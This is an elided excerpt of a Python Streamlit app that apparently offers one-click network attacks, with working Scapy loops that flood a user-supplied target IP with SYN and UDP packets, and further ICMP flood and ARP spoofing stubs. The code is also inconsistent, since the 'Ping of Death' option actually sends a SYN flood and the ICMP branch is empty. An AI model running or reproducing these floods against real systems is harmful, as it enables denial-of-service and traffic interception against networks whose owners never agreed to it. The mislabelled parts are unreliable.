    ...
    if not st.session_state.logged_in:
        ...
        # Classical Attacks Section
            ...
            ***ARP and DNS Spoofing Attacks*** 🎭
            ...
            - Flooding attacks (such as SYN Flood, UDP Flood, and ICMP Flood) run in loops. To stop them, you must manually interrupt the process by halting the Streamlit server (Ctrl + C).
            ...
            if st.button("Execute Attack"):
                ...
                if attack_type == "Ping of Death ☠️":
                    ...
                    st.success("SYN packet sent. 🌊")
                    while True:
                       # Note: This will flood continuously until stopped
                        send(IP(dst=target_ip)/TCP(sport=12345, dport=80, flags="S"))

                elif attack_type == "UDP Flood 🚀":
                    st.write("Executing UDP Flood attack... 🚀")
                    st.success("UDP packet sent. 🚀") 
                    while True:
                         # Note: This will flood continuously until stopped
                        send(IP(dst=target_ip)/UDP(sport=12345, dport=53))

                elif attack_type == "ICMP Flood 🌩️":
                    st.write("Executing ICMP Flood attack... 🌩️")
                    st.success("ICMP packet sent. 🌩️") 
                    while True:
                         # Note: This will flood continuously until stopped
                    ...
                    if st.button("Start ARP Spoofing"):
                        ...
                        # Perform ARP Spoofing (Assuming you want to poison the gateway)
